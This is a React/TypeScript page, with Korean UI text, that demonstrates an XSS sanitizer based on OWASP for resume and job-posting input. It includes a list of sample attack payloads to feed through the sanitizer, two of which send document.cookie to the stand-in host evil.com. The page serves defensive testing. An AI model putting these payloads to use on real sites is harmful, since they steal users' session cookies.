"use client";

import { useState, useEffect, useCallback } from "react";
import { Shield, ShieldAlert, ShieldCheck, Zap, BarChart2, RefreshCw } from "lucide-react";

const API_BASE = "http://localhost:8080";

type PolicyType = "PLAIN_TEXT" | "RESUME" | "RICH_TEXT";

interface SanitizeResponse {
    original: string;
    sanitized: string;
    policy: string;
    changed: boolean;
    removedLength: number;
}

interface SanitizerStats {
    totalSanitized: number;
    threatsDetected: number;
}

const POLICY_DESCRIPTIONS: Record<PolicyType, { label: string; desc: string; color: string }> = {
    PLAIN_TEXT: {
        label: "Plain Text",
        desc: "모든 HTML 태그 제거 — 이름, 이메일, 검색어 등 순수 텍스트 필드용",
        color: "bg-blue-500/15 text-blue-400 border-blue-500/30",
    },
    RESUME: {
        label: "Resume",
        desc: "안전한 포맷 태그만 허용 (b, i, ul, li, p) — OCR 이력서 내용 저장용",
        color: "bg-emerald-500/15 text-emerald-400 border-emerald-500/30",
    },
    RICH_TEXT: {
        label: "Rich Text",
        desc: "헤딩·테이블·링크 허용 (https:// 만) — 채용공고 상세 설명용",
        color: "bg-violet-500/15 text-violet-400 border-violet-500/30",
    },
};

const ATTACK_EXAMPLES = [
    {
        label: "Script Injection",
        value: "<p>경력 사항</p><script>fetch('https://evil.com?c='+document.cookie)</script>",
    },
    {
        label: "XSS via Event Handler",
        value: '<img src="x" onerror="alert(document.domain)"><b>이름: 홍길동</b>',
    },
    {
        label: "Iframe Phishing",
        value: '<p>회사: ACME</p><iframe src="https://phishing.com" style="display:none"></iframe>',
    },
    {
        label: "javascript: URI",
        value: '<a href="javascript:void(eval(atob(\'YWxlcnQoMSk=\')))">링크</a>',
    },
    {
        label: "CSS Expression (IE)",
        value: '<div style="width:expression(alert(1))">직무: Backend</div>',
    },
    {
        label: "SVG Onload",
        value: '<svg onload="new Image().src=\'//evil.com/?x=\'+document.cookie"><circle/></svg>',
    },
];

function PolicyBadge({ policy }: { policy: PolicyType }) {
    const { label, color } = POLICY_DESCRIPTIONS[policy];
    return (
        <span className={`px-2 py-0.5 rounded-full text-xs font-semibold border ${color}`}>
            {label}
        </span>
    );
}

function StatCard({
    icon,
    label,
    value,
    accent,
}: {
    icon: React.ReactNode;
    label: string;
    value: number | string;
    accent: string;
}) {
    return (
        <div className={`bg-neutral-900 border rounded-2xl p-5 space-y-2 shadow-xl hover:border-neutral-600 transition-colors ${accent}`}>
            <div className="flex items-center gap-2 text-neutral-400 text-sm">{icon}{label}</div>
            <div className="text-3xl font-bold text-white">{value}</div>
        </div>
    );
}

export default function XssSanitizerPage() {
    const [input, setInput] = useState(ATTACK_EXAMPLES[0].value);
    const [policy, setPolicy] = useState<PolicyType>("RESUME");
    const [result, setResult] = useState<SanitizeResponse | null>(null);
    const [stats, setStats] = useState<SanitizerStats | null>(null);
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState<string | null>(null);

    const fetchStats = useCallback(async () => {
        try {
            const res = await fetch(`${API_BASE}/api/sanitizer/stats`);
            if (res.ok) setStats(await res.json());
        } catch {
            // stats are non-critical
        }
    }, []);

    useEffect(() => {
        fetchStats();
    }, [fetchStats]);

    const handleSanitize = async () => {
        if (!input.trim()) return;
        setLoading(true);
        setError(null);
        try {
            const res = await fetch(`${API_BASE}/api/sanitizer/preview`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ input, policy }),
            });
            if (!res.ok) throw new Error(`HTTP ${res.status}`);
            const data: SanitizeResponse = await res.json();
            setResult(data);
            await fetchStats();
        } catch (e: unknown) {
            setError(e instanceof Error ? e.message : "요청 실패");
        } finally {
            setLoading(false);
        }
    };

    const threatRate =
        stats && stats.totalSanitized > 0
            ? ((stats.threatsDetected / stats.totalSanitized) * 100).toFixed(1)
            : "0.0";

    return (
        <main className="min-h-screen bg-neutral-950 text-white px-4 py-10">
            <div className="max-w-5xl mx-auto space-y-8">

                {/* Header */}
                <div className="space-y-2">
                    <div className="flex items-center gap-3">
                        <Shield className="w-7 h-7 text-emerald-400" />
                        <h1 className="text-2xl font-bold tracking-tight">XSS Sanitizer</h1>
                    </div>
                    <p className="text-neutral-400 text-sm leading-relaxed max-w-2xl">
                        OWASP Java HTML Sanitizer 기반 XSS 방어 시스템.
                        사용자 입력(이력서 내용, 채용공고 등)의 위험 HTML을 정책별로 필터링합니다.
                        OCR로 추출된 이력서 텍스트에 포함된 스크립트 인젝션을 서비스 레이어 진입 전에 차단합니다.
                    </p>
                </div>

                {/* Stats */}
                <div className="grid grid-cols-3 gap-4">
                    <StatCard
                        icon={<Zap className="w-4 h-4" />}
                        label="총 Sanitization 횟수"
                        value={stats?.totalSanitized?.toFixed(0) ?? "—"}
                        accent="border-neutral-700"
                    />
                    <StatCard
                        icon={<ShieldAlert className="w-4 h-4" />}
                        label="위협 탐지 횟수"
                        value={stats?.threatsDetected?.toFixed(0) ?? "—"}
                        accent="border-rose-500/30"
                    />
                    <StatCard
                        icon={<BarChart2 className="w-4 h-4" />}
                        label="위협 탐지율"
                        value={`${threatRate}%`}
                        accent="border-amber-500/30"
                    />
                </div>

                {/* Policy Selector */}
                <div className="bg-neutral-900 border border-neutral-700 rounded-2xl p-6 space-y-4">
                    <h2 className="text-sm font-semibold text-neutral-300 uppercase tracking-wider">정책 선택</h2>
                    <div className="grid grid-cols-3 gap-3">
                        {(Object.keys(POLICY_DESCRIPTIONS) as PolicyType[]).map((p) => {
                            const { label, desc, color } = POLICY_DESCRIPTIONS[p];
                            const active = policy === p;
                            return (
                                <button
                                    key={p}
                                    onClick={() => setPolicy(p)}
                                    className={`rounded-xl p-4 text-left border transition-all ${
                                        active
                                            ? `border ${color} bg-neutral-800`
                                            : "border-neutral-700 bg-neutral-900 hover:border-neutral-500"
                                    }`}
                                >
                                    <div className="font-semibold text-sm mb-1">{label}</div>
                                    <div className="text-xs text-neutral-400 leading-snug">{desc}</div>
                                </button>
                            );
                        })}
                    </div>
                </div>

                {/* Input + Examples */}
                <div className="bg-neutral-900 border border-neutral-700 rounded-2xl p-6 space-y-4">
                    <div className="flex items-center justify-between">
                        <h2 className="text-sm font-semibold text-neutral-300 uppercase tracking-wider">입력</h2>
                        <div className="flex gap-2 flex-wrap">
                            {ATTACK_EXAMPLES.map((ex) => (
                                <button
                                    key={ex.label}
                                    onClick={() => setInput(ex.value)}
                                    className="px-2 py-1 text-xs rounded-lg bg-neutral-800 border border-neutral-600 text-neutral-300 hover:border-rose-500/60 hover:text-rose-300 transition-colors"
                                >
                                    {ex.label}
                                </button>
                            ))}
                        </div>
                    </div>
                    <textarea
                        value={input}
                        onChange={(e) => setInput(e.target.value)}
                        rows={5}
                        className="w-full bg-neutral-950 border border-neutral-700 rounded-xl px-4 py-3 text-sm text-white placeholder-neutral-500 font-mono focus:outline-none focus:border-emerald-500 resize-none"
                        placeholder="XSS 공격 페이로드 또는 일반 HTML을 입력하세요..."
                    />
                    <div className="flex items-center gap-3">
                        <button
                            onClick={handleSanitize}
                            disabled={loading || !input.trim()}
                            className="flex items-center gap-2 px-5 py-2.5 bg-emerald-600 hover:bg-emerald-500 disabled:opacity-40 rounded-xl text-sm font-semibold transition-colors"
                        >
                            {loading ? (
                                <RefreshCw className="w-4 h-4 animate-spin" />
                            ) : (
                                <Shield className="w-4 h-4" />
                            )}
                            Sanitize
                        </button>
                        <PolicyBadge policy={policy} />
                    </div>
                </div>

                {/* Error */}
                {error && (
                    <div className="bg-rose-500/10 border border-rose-500/30 text-rose-400 rounded-xl p-4 text-sm">
                        {error}
                    </div>
                )}

                {/* Result */}
                {result && (
                    <div className="bg-neutral-900 border border-neutral-700 rounded-2xl p-6 space-y-5">
                        <div className="flex items-center justify-between">
                            <h2 className="text-sm font-semibold text-neutral-300 uppercase tracking-wider">결과</h2>
                            {result.changed ? (
                                <div className="flex items-center gap-2 text-rose-400 text-xs font-semibold">
                                    <ShieldAlert className="w-4 h-4" />
                                    위협 탐지 — {result.removedLength}자 제거됨
                                </div>
                            ) : (
                                <div className="flex items-center gap-2 text-emerald-400 text-xs font-semibold">
                                    <ShieldCheck className="w-4 h-4" />
                                    변경 없음 — 안전한 입력
                                </div>
                            )}
                        </div>

                        <div className="grid grid-cols-2 gap-4">
                            <div className="space-y-2">
                                <div className="text-xs text-neutral-500 uppercase tracking-wider">Original</div>
                                <pre className="bg-neutral-950 border border-rose-500/20 rounded-xl p-4 text-xs font-mono text-rose-300 whitespace-pre-wrap overflow-auto max-h-48">
                                    {result.original}
                                </pre>
                            </div>
                            <div className="space-y-2">
                                <div className="text-xs text-neutral-500 uppercase tracking-wider">Sanitized</div>
                                <pre className="bg-neutral-950 border border-emerald-500/20 rounded-xl p-4 text-xs font-mono text-emerald-300 whitespace-pre-wrap overflow-auto max-h-48">
                                    {result.sanitized || "(empty — all content stripped)"}
                                </pre>
                            </div>
                        </div>

                        <div className="bg-neutral-950 border border-neutral-700 rounded-xl p-4">
                            <div className="text-xs text-neutral-500 uppercase tracking-wider mb-3">브라우저 렌더링 미리보기 (sanitized)</div>
                            <div
                                className="text-sm text-neutral-200 leading-relaxed"
                                dangerouslySetInnerHTML={{ __html: result.sanitized }}
                            />
                        </div>
                    </div>
                )}

                {/* How it works */}
                <div className="bg-neutral-900 border border-neutral-700 rounded-2xl p-6 space-y-4">
                    <h2 className="text-sm font-semibold text-neutral-300 uppercase tracking-wider">동작 원리</h2>
                    <div className="grid grid-cols-3 gap-4 text-sm">
                        {[
                            {
                                step: "01",
                                title: "@Sanitize AOP",
                                desc: "서비스 메서드에 @Sanitize(policy=RESUME) 선언 시 SanitizeAspect가 파라미터를 자동 정제",
                            },
                            {
                                step: "02",
                                title: "OWASP HtmlPolicyBuilder",
                                desc: "allowElements/allowAttributes로 화이트리스트 구성. 블랙리스트가 아닌 화이트리스트 방식으로 우회 불가",
                            },
                            {
                                step: "03",
                                title: "Micrometer 메트릭",
                                desc: "위협 탐지 시 xss.sanitization.threat_detected 카운터 증가 → Grafana 알림 연동",
                            },
                        ].map(({ step, title, desc }) => (
                            <div key={step} className="space-y-2">
                                <div className="text-2xl font-bold text-neutral-600">{step}</div>
                                <div className="font-semibold text-neutral-200">{title}</div>
                                <div className="text-neutral-400 text-xs leading-relaxed">{desc}</div>
                            </div>
                        ))}
                    </div>
                </div>
            </div>
        </main>
    );
}
